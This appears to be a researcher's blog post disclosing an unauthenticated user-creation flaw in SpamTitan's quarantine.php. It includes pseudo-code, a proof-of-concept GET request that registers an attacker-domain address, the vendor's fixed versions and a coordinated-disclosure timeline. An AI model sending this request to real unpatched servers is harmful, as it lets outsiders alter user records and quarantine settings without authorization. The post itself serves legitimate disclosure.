<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta property="og:title" content="SpamTitan Vulnerability Disclosure">
  <meta property="og:description" content="Vulnerability disclosure. A missing authorization vulnerability discovered during research performed with Philippe Caturegli of Seralys.">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://julian-b.xyz/posts/spamtian_vuln.html">
  <meta property="og:image" content="https://yourusername.github.io/blog/images/preview.png">

  <title>dead1nfluence | SpamTitan</title>
  <style>
    /* --- Global Hacker Terminal Styles --- */
    body {
      background-color: #050505;
      color: #9efc9e;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
      line-height: 1.5;
    }

    h1, h2 {
      color: #cfeecf;
      text-align: center;
      margin: 1rem 0 0.5rem;
      font-weight: normal;
    }

    h2 { 
      font-size: 1.2rem;
      text-align: left;
      margin-top: 2rem;
    }

    a {
      color: #7de07d;
      text-decoration: none;
    }

    a:hover {
      color: #d3ffd3;
      text-decoration: underline;
    }

    .post {
      max-width: 900px;
      width: 100%;
      margin: 0 auto;
      border: 1px solid #1f1f1f;
      padding: 1.5rem 2rem;
      background: linear-gradient(180deg, #050505 0%, #0a0a0a 100%);
      box-shadow: 0 10px 30px rgba(0,0,0,0.7), inset 0 2px 0 #0b6623;
      border-radius: 8px;
    }

    .meta {
      font-size: 0.9rem;
      margin-bottom: 2rem;
      opacity: 0.8;
      text-align: center;
    }

    p {
      text-align: left;
      margin-bottom: 1.5rem;
      text-shadow: 0 0 2px #0b6623, 0 0 1px #0b6623;
    }

    pre {
      background-color: #111;
      padding: 1rem;
      border: 1px solid #1f1f1f;
      text-align: left;
      overflow-x: auto;
      margin-bottom: 1.5rem;
      color: #9efc9e;
      border-radius: 4px;
      box-shadow: inset 0 2px 0 #0b6623;
    }

    code {
      font-family: monospace;
      color: #9efc9e;
    }

    .back-link {
      margin-top: 3rem;
      text-align: center;
    }

    .back-link a {
      font-weight: bold;
      text-shadow: 0 0 2px #0b6623;
    }

    /* Scrollbar styling to match hacker theme */
    body::-webkit-scrollbar {
      width: 10px;
    }

    body::-webkit-scrollbar-track {
      background: #111;
    }

    body::-webkit-scrollbar-thumb {
      background: #1f1f1f;
      border-radius: 5px;
    }

    body::-webkit-scrollbar-thumb:hover {
      background: #7de07d;
    }
  </style>
</head>
<body>
  <div class="post">
    <h1>> Unauthenticated User Creation in SpamTitan</h1>
<div class="meta">Posted: August 20, 2025 | Author: dead1nfluence</div>

<h2>[~] Overview</h2>
<p>The file <code>quarantine.php</code> within the SpamTitan interface allows unauthenticated users to trigger account-level actions using a crafted GET request. Notably, when a non-existent email address is provided as part of the <code>email</code> parameter, SpamTitan will automatically create a user record and associate quarantine settings with it â€” all without requiring authentication.</p>

<p>This allows an attacker to manipulate internal application behavior or inject data into the user base, potentially leading to privilege escalation paths or information leaks in misconfigured environments.</p>

<h2>[~] Technical Details</h2>
<p><strong>Affected Endpoint:</strong> <code>quarantine.php</code></p>

<p>Unauthenticated request triggers user creation:</p>
<pre><code>/quarantine.php?language=en&role_type=admin&action=setperiod&
email=admin@attacker.com&period=WD&secret_id=1</code></pre>

<p><strong>Pseudo-code logic:</strong></p>
<pre><code>$email = $_GET['email'];
if (!empty($email)) {
    $user_id = db_getmaddr_id($email); 
}</code></pre>

<p><strong>Helper function (simplified behavior):</strong></p>
<pre><code>function db_getmaddr_id($email, $create = 1) {
    if (not exists in `maddr` table and $create == 1) {
        INSERT INTO maddr (email, domain)
    }
    return user_id;
}</code></pre>

<ul>
<li>Because <code>db_getmaddr_id($email)</code> is invoked with only one argument, the default value <code>$create = 1</code> is used, which triggers implicit user creation.</li>
<li>No session or authentication checks are performed prior to executing the action.</li>
<li>The <code>role_type</code> parameter (e.g., <code>admin</code>) is accepted via query string but never validated.</li>
</ul>

<h2>[~] Proof of Concept</h2>
<pre><code>GET /quarantine.php?language=en&role_type=admin&action=setperiod&
email=user@attacker.com&period=WD&secret_id=1 HTTP/1.1
Host: spamtitan.local</code></pre>

<p><strong>Effect:</strong></p>
<ul>
<li>A new user <code>user@attacker.com</code> is silently created.</li>
<li>Digest preference is set to "weekly".</li>
<li>No authentication or token is required.</li>
</ul>

<h2>[~] Impact</h2>
<ul>
<li>Unauthenticated creation of internal user records</li>
<li>Manipulation of quarantine report settings for arbitrary emails</li>
<li>Potential for denial of service or persistence via spam report hijacking</li>
<li>Expands the application attack surface for further exploitation</li>
</ul>

<h2>[~] Vendor Response</h2>
<p>TitanHQ implemented fixes for this vulnerability as part of a coordinated disclosure effort.</p>
<p>The issue has been resolved in the following versions:</p>
<ul>
<li>SpamTitan Gateway v.8.00.101</li>
<li>SpamTitan Gateway v.8.01.14</li>
</ul>
<p><em>Note:</em> if a customer has set the token expiration period to 0 (disabling tokens), then it would still be possible to add users. The quarantine settings page now shows a warning if a customer has this set to 0, and going forward it is not possible to set the token expiration period lower than 1.</p>

<h2>[~] Timeline</h2>
<ul>
<li>2024-05-12: Vulnerability discovered during a pentest</li>
<li>2025-04-24: Advisory drafted</li>
<li>2025-04-28: Initial advisory submitted to TitanHQ</li>
<li>2025-05-06: Follow up #1 from Seralys</li>
<li>2025-05-16: Follow up #2 from Seralys</li>
<li>2025-05-19: TitanHQ acknowledged receipt and initiated coordination</li>
<li>2025-06-13: TitanHQ publicly released a fix in v8.00.101 and v8.01.14</li>
<li>2025-08-20: Public disclosure by Seralys</li>
</ul>

<div class="back-link">
      <a href="../index.html">[*] Back to main</a>
    </div>
  </div>

</body>
</html>
